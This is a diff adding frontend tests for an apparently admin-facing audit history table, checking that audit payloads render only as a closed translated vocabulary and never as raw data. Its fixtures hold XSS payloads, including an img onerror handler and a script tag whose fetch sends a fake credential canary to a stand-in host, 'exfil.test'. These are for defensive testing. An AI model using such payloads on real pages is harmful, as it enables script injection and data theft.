@@ -31,6 +31,7 @@ const resetRuntimeSetting = vi.fn();
 const listManagedSecrets = vi.fn();
 const setManagedSecret = vi.fn();
 const removeManagedSecret = vi.fn();
+const listControlPlaneAudit = vi.fn();
 
 vi.mock('@/lib/application-api', async () => {
   const actual = await vi.importActual<typeof import('@/lib/application-api')>(
@@ -48,6 +49,7 @@ vi.mock('@/lib/application-api', async () => {
     listManagedSecrets: (...args: unknown[]) => listManagedSecrets(...args),
     setManagedSecret: (...args: unknown[]) => setManagedSecret(...args),
     removeManagedSecret: (...args: unknown[]) => removeManagedSecret(...args),
+    listControlPlaneAudit: (...args: unknown[]) => listControlPlaneAudit(...args),
   };
 });
 
@@ -108,6 +110,22 @@ beforeEach(() => {
   listFeatureFlags.mockResolvedValue([flag()]);
   listRuntimeSettings.mockResolvedValue([setting()]);
   listManagedSecrets.mockResolvedValue([secret()]);
+  listControlPlaneAudit.mockResolvedValue({
+    items: [
+      {
+        id: 'audit_1',
+        occurredAt: '2026-08-24T12:00:00.000Z',
+        actorUserId: 'user_1',
+        resource: 'featureFlag',
+        action: 'featureFlag.setPlatformOverride',
+        resourceKey: 'agents.enabled',
+        organizationId: null,
+        before: null,
+        after: { kind: 'featureFlagOverride', enabled: true },
+      },
+    ],
+    nextCursor: null,
+  });
 });
 
 /**
@@ -226,6 +244,7 @@ describe('ControlPlaneBlock', () => {
     expect(listFeatureFlags).not.toHaveBeenCalled();
     expect(listRuntimeSettings).not.toHaveBeenCalled();
     expect(listManagedSecrets).not.toHaveBeenCalled();
+    expect(listControlPlaneAudit).not.toHaveBeenCalled();
   });
 
   it('loads only the panel that is open', async () => {
@@ -242,6 +261,21 @@ describe('ControlPlaneBlock', () => {
     await openTab(/credentials/i);
 
     await waitFor(() => expect(listManagedSecrets).toHaveBeenCalled());
+  });
+
+  it('loads safe audit history only when its tab is opened', async () => {
+    allowGlobalPermissions('controlPlane:read');
+
+    renderWithProviders(<ControlPlaneBlock />);
+    await screen.findByText('agents.enabled');
+
+    await openTab(/audit history/i);
+
+    await screen.findByText(/set platform override/i);
+    expect(listControlPlaneAudit).toHaveBeenCalledTimes(1);
+    expect(screen.getByText('user_1')).toBeInTheDocument();
+    // The client renders a closed safe projection, not arbitrary JSON.
+    expect(screen.getByText(/no stored state → enabled/i)).toBeInTheDocument();
   });
 });
 
@@ -877,5 +911,253 @@ describe('managed secrets', () => {
 
     await screen.findByText(/cannot be decrypted/i);
     expect(screen.getByText(/^Configured$/)).toBeInTheDocument();
+  });
+});
+
+/**
+ * The audit table is the one control-plane surface fed by data the client did
+ * not shape, so it is the one worth proving cannot leak.
+ *
+ * `before` and `after` are `unknown` on the wire, and `action` is a union the
+ * server chooses from. The backend writes only safe projections today, and the
+ * client is nonetheless written as if it does not: it renders a closed
+ * vocabulary and never stringifies the JSON it was handed. That decision is
+ * invisible in the code — `stateSummary` returning a translated string looks
+ * like a formatting choice — so without a test it survives exactly until
+ * somebody "improves" it into `JSON.stringify(event.before)` to show operators
+ * more detail.
+ *
+ * ## What is projected, and what is deliberately not
+ *
+ * `before`, `after` and `action` are projected: nothing of their content is
+ * written to the DOM, only a translated term the client chose. `actorUserId`,
+ * `resourceKey`, `organizationId` and `occurredAt` *are* rendered verbatim, on
+ * purpose — the first three are the identifiers an operator reads the row for
+ * and a projection would make the history useless, and the fourth is the
+ * machine-readable half of a `<time>` element. They are covered by their own
+ * case below rather than left unstated, because "the audit table cannot render
+ * arbitrary data" would be a false claim about those four. What makes them safe
+ * is that they are escaped React text or attributes and the backend writes them
+ * from closed sets — not that the client checks them.
+ *
+ * These fixtures are what a regression would leak: a recognizable credential
+ * canary planted in every shape one could reach it through — an unknown `kind`,
+ * a known `kind` carrying extra fields, a nested object, an array, a bare
+ * string, markup, and an action this build has no copy for.
+ */
+describe('the audit table projects the payload it is handed', () => {
+  /**
+   * One string, distinctive enough that finding it anywhere in the document is
+   * unambiguous, and shaped like the thing whose exposure would actually
+   * matter.
+   */
+  const CANARY = 'sk-live-AUDITCANARY-9f3c2a71b4e8-do-not-render';
+
+  const event = (
+    id: string,
+    before: unknown,
+    after: unknown,
+  ): Record<string, unknown> => ({
+    id,
+    occurredAt: '2026-08-24T12:00:00.000Z',
+    actorUserId: 'user_1',
+    resource: 'runtimeSetting',
+    action: 'runtimeSetting.set',
+    resourceKey: 'knowledge.retrieval_max_chunks',
+    organizationId: null,
+    before,
+    after,
+  });
+
+  /**
+   * Every route the canary could travel, in one page.
+   *
+   * Listed exhaustively rather than as one representative case because the
+   * regressions differ: an unknown `kind` is what a *new backend projection*
+   * looks like to an old client, extra fields on a known `kind` are what a
+   * widened projection looks like, and a bare string or an array is what a bug
+   * or an attacker writing straight to the column looks like.
+   */
+  const HOSTILE = [
+    // A shape this client has never been taught, which is the case the
+    // fall-through summary exists for.
+    event('audit_unknown_kind', null, { kind: 'somethingNew', secret: CANARY }),
+    // A known kind that grew a field. The summary must read the fields it
+    // knows and ignore the rest rather than widening to whatever arrived.
+    event(
+      'audit_widened_known_kind',
+      { kind: 'runtimeSettingValue', redacted: true, value: CANARY },
+      { kind: 'runtimeSettingValue', redacted: false, value: CANARY },
+    ),
+    event(
+      'audit_secret_slot',
+      { kind: 'managedSecretSlot', configured: false },
+      { kind: 'managedSecretSlot', configured: true, plaintext: CANARY },
+    ),
+    event(
+      'audit_flag_note',
+      { kind: 'featureFlagOverride', enabled: false, note: CANARY },
+      { kind: 'featureFlagOverride', enabled: true, note: CANARY },
+    ),
+    // Nested and inside an array: a stringify would find both.
+    event('audit_nested', { deep: { deeper: [{ leaked: CANARY }] } }, [CANARY]),
+    // Not an object at all.
+    event('audit_primitive', CANARY, 42),
+    // Markup, so the assertion on `innerHTML` is about escaping too and not
+    // only about the absence of a substring.
+    event(
+      'audit_markup',
+      `<img src=x onerror="alert('${CANARY}')">`,
+      `<script>fetch('https://exfil.test/${CANARY}')</script>`,
+    ),
+    // An `action` this build has no copy for. `t()` does not throw on a missing
+    // key — `use-intl` falls back to the key *path* — so an unprojected action
+    // would print this string into the table verbatim.
+    {
+      ...event('audit_unknown_action', null, null),
+      action: `runtimeSetting.${CANARY}`,
+    },
+    /**
+     * An unparseable timestamp. `Intl.DateTimeFormat.format` throws `RangeError`
+     * on one, and the call is in the render body inside `items.map` — so
+     * unguarded it takes the whole screen down, not one cell.
+     *
+     * Not the canary: `occurredAt` is rendered verbatim into the `<time>`
+     * element's `dateTime` attribute, which is the machine-readable half of the
+     * column and is meant to be the value the server sent. It belongs with the
+     * identifying columns below, not with the projected ones.
+     */
+    { ...event('audit_bad_timestamp', null, null), occurredAt: 'not-a-time' },
+  ];
+
+  beforeEach(() => {
+    listControlPlaneAudit.mockResolvedValue({
+      items: HOSTILE,
+      nextCursor: null,
+    });
+  });
+
+  /** Every body row of the audit table, so nothing asserts against the tabs. */
+  const auditRows = () => screen.getAllByRole('row').slice(1);
+
+  it('never puts audit payload data into the DOM', async () => {
+    allowGlobalPermissions('controlPlane:read');
+
+    renderWithProviders(<ControlPlaneBlock />);
+    await screen.findByText('agents.enabled');
+    await openTab(/audit history/i);
+
+    // The table did render every hostile row, so the assertions below are about
+    // a populated page rather than about an empty panel — and the count is what
+    // proves the invalid-timestamp row did not take the screen down with it.
+    await screen.findAllByRole('row');
+    expect(auditRows()).toHaveLength(HOSTILE.length);
+
+    expect(document.body.innerHTML).not.toContain(CANARY);
+    expect(document.body.textContent).not.toContain(CANARY);
+
+    // The markup fixture would have to be escaped to be safe; not being there
+    // at all is stronger, and this says which of the two happened. Scoped to
+    // the table, so an unrelated image elsewhere in the panel cannot fail this
+    // for a reason that has nothing to do with containment.
+    expect(document.body.innerHTML).not.toContain('onerror');
+
+    for (const row of auditRows()) {
+      expect(row.querySelector('script')).toBeNull();
+      expect(row.querySelector('img')).toBeNull();
+    }
+  });
+
+  /**
+   * The three fields that *are* rendered verbatim, stated rather than implied.
+   *
+   * A test that only proved the payload is projected would read as though the
+   * whole row were, and the next reader would assume `resourceKey` is safe to
+   * widen. It is not projected: it is escaped React text, and the reason it is
+   * safe is that the backend writes it from a closed registry.
+   */
+  it('renders the identifying columns verbatim, as escaped text', async () => {
+    allowGlobalPermissions('controlPlane:read');
+    listControlPlaneAudit.mockResolvedValue({
+      items: [
+        {
+          ...event('audit_identifiers', null, null),
+          actorUserId: 'user_visible',
+          resourceKey: 'knowledge.retrieval_max_chunks',
+          organizationId: 'org_visible',
+        },
+      ],
+      nextCursor: null,
+    });
+
+    renderWithProviders(<ControlPlaneBlock />);
+    await screen.findByText('agents.enabled');
+    await openTab(/audit history/i);
+
+    expect(await screen.findByText('user_visible')).toBeInTheDocument();
+    expect(screen.getByText('org_visible')).toBeInTheDocument();
+    expect(
+      screen.getByText('knowledge.retrieval_max_chunks'),
+    ).toBeInTheDocument();
+  });
+
+  /**
+   * The other half of the claim, and the half that stops the first from being
+   * satisfiable by rendering nothing.
+   *
+   * A closed projection means every row still says something true about what
+   * changed — drawn from the client's own translated vocabulary rather than
+   * from the payload.
+   */
+  it('still summarises each change from its own closed vocabulary', async () => {
+    allowGlobalPermissions('controlPlane:read');
+
+    renderWithProviders(<ControlPlaneBlock />);
+    await screen.findByText('agents.enabled');
+    await openTab(/audit history/i);
+
+    await screen.findAllByRole('row');
+
+    const { english } = await import('@/test/render');
+    const vocabulary: string[] = Object.values(
+      english.ControlPlane.audit.state,
+    );
+
+    // The last cell of each body row is the change column. Read off the DOM
+    // rather than by matching expected text, so a row that rendered something
+    // outside the vocabulary is caught rather than merely not found.
+    const summaries = screen
+      .getAllByRole('row')
+      .slice(1)
+      .map((row) => {
+        const cells = row.querySelectorAll('td');
+
+        return cells[cells.length - 1]?.textContent ?? '';
+      });
+
+    // And the action column, which is the other closed vocabulary: an action
+    // with no copy must resolve to the client's own fall-through term rather
+    // than to its own key path.
+    const actions = screen
+      .getAllByRole('row')
+      .slice(1)
+      .map((row) => row.querySelectorAll('td')[2]?.textContent ?? '');
+
+    const actionVocabulary: string[] = [
+      english.ControlPlane.audit.action.unknown,
+      ...Object.values(english.ControlPlane.audit.action.runtimeSetting),
+    ];
+
+    for (const action of actions) expect(actionVocabulary).toContain(action);
+
+    expect(summaries).toHaveLength(HOSTILE.length);
+
+    for (const summary of summaries) {
+      const parts = summary.split('→').map((part) => part.trim());
+
+      expect(parts).toHaveLength(2);
+
+      for (const part of parts) expect(vocabulary).toContain(part);
+    }
   });
 });
